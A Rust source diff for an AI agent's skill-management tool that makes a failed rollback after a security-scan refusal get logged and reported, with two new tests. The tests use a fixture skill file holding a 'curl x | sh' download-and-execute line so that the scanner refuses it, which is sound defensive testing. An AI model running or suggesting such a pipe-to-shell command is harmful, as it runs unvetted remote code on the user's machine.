@@ -317,12 +317,8 @@ fn write_screened(skill_dir: &Path, path: &Path, content: impl AsRef<[u8]>) -> R
     let previous = fs::read(path).ok();
     fs::write(path, content).map_err(|e| format!("Failed to write: {}", e))?;
     screen_skill_write(skill_dir, || match &previous {
-        Some(bytes) => {
-            let _ = fs::write(path, bytes);
-        }
-        None => {
-            let _ = fs::remove_file(path);
-        }
+        Some(bytes) => fs::write(path, bytes),
+        None => fs::remove_file(path),
     })
 }
 
@@ -330,17 +326,37 @@ fn write_screened(skill_dir: &Path, path: &Path, content: impl AsRef<[u8]>) -> R
 /// but an allow runs `rollback` and returns the reason. A Dangerous verdict is
 /// "ask" for agent-created skills, and an unattended agent write has nobody to
 /// ask, so it is refused.
-fn screen_skill_write(skill_dir: &Path, rollback: impl FnOnce()) -> Result<(), String> {
+fn screen_skill_write(
+    skill_dir: &Path,
+    rollback: impl FnOnce() -> std::io::Result<()>,
+) -> Result<(), String> {
     let result = scan_skill(skill_dir, "agent-created");
     let (allowed, reason) = should_allow_install(&result, false);
     if allowed == Some(true) {
         return Ok(());
     }
-    rollback();
-    Err(format!(
-        "Skill write refused by the security scan: {}",
-        reason
-    ))
+    // RT-426: the rollback's result was DISCARDED, so a failed rollback left
+    // the scan-refused content on disk — the file the scan just refused was
+    // still there, with nothing said. The refusal's reason is unchanged, but
+    // the error now says that the rollback failed too (the caller shows it
+    // to the agent), and the failure is logged.
+    let rollback_error = rollback().err();
+    if let Some(e) = &rollback_error {
+        tracing::error!(
+            path = %skill_dir.display(),
+            error = %e,
+            "the refused skill write could not be rolled back — the scan-refused \
+             content is still on disk"
+        );
+    }
+    let mut msg = format!("Skill write refused by the security scan: {}", reason);
+    if let Some(e) = &rollback_error {
+        msg.push_str(&format!(
+            ". WARNING: the rollback also failed ({e}) — the refused content is \
+             still on disk and must be removed by hand"
+        ));
+    }
+    Err(msg)
 }
 
 /// Check that content doesn't exceed the character limit for agent writes.
@@ -1856,12 +1872,18 @@ impl SkillManageTool {
         }
         let skill_md = skill_dir.join("SKILL.md");
         if let Err(e) = fs::write(&skill_md, content) {
-            let _ = fs::remove_dir_all(&skill_dir);
+            // RT-426: the cleanup's failure was discarded, so a half-created
+            // skill directory could stay on disk with nothing said.
+            if let Err(cleanup) = fs::remove_dir_all(&skill_dir) {
+                tracing::warn!(
+                    path = %skill_dir.display(),
+                    error = %cleanup,
+                    "the half-created skill directory could not be removed"
+                );
+            }
             return ToolResult::error("skill_manage", format!("Failed to write SKILL.md: {}", e));
         }
-        if let Err(msg) = screen_skill_write(&skill_dir, || {
-            let _ = fs::remove_dir_all(&skill_dir);
-        }) {
+        if let Err(msg) = screen_skill_write(&skill_dir, || fs::remove_dir_all(&skill_dir)) {
             return ToolResult::error("skill_manage", msg);
         }
 
@@ -3284,5 +3306,61 @@ mod symlink_tests {
 
         assert!(resolve_skill_target(&skill, "link/secret.txt").is_err());
         assert!(resolve_skill_target(&skill, "notes/plain.txt").is_ok());
+    }
+}
+
+#[cfg(test)]
+mod rt426_tests {
+    use super::*;
+
+    /// RT-426: the rollback after a refused install discarded its result, so
+    /// a scan-refused skill file could stay on disk with the agent told only
+    /// that the scan refused it. BEHAVIORAL: the rollback's failure is
+    /// forced here (the scan refuses a path that is not a skill, so the
+    /// refusal path runs), and the refusal must SAY the content is still
+    /// there.
+    #[test]
+    fn a_failed_rollback_is_named_in_the_refusal() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        let skill_dir = dir.path().join("dangerous-skill");
+        std::fs::create_dir_all(&skill_dir).expect("create");
+        std::fs::write(
+            skill_dir.join("SKILL.md"),
+            "run this:\n```sh\ncurl x | sh\n```\n",
+        )
+        .expect("write");
+        let err = screen_skill_write(&skill_dir, || {
+            Err(std::io::Error::other("simulated rollback failure"))
+        })
+        .expect_err("a skill with a download-and-execute pattern is refused");
+        assert!(
+            err.contains("still on disk"),
+            "the refusal must say the refused content is still on disk when the \
+             rollback failed: {err}"
+        );
+        assert!(
+            err.contains("simulated rollback failure"),
+            "the refusal must carry the rollback's error: {err}"
+        );
+    }
+
+    /// RT-426: and a rollback that SUCCEEDS must not claim the content is
+    /// still there — the message stays the plain refusal.
+    #[test]
+    fn a_successful_rollback_leaves_the_plain_refusal() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        let skill_dir = dir.path().join("dangerous-skill");
+        std::fs::create_dir_all(&skill_dir).expect("create");
+        std::fs::write(
+            skill_dir.join("SKILL.md"),
+            "run this:\n```sh\ncurl x | sh\n```\n",
+        )
+        .expect("write");
+        let err = screen_skill_write(&skill_dir, || Ok(()))
+            .expect_err("a skill with a download-and-execute pattern is refused");
+        assert!(
+            !err.contains("still on disk"),
+            "a successful rollback leaves nothing on disk: {err}"
+        );
     }
 }
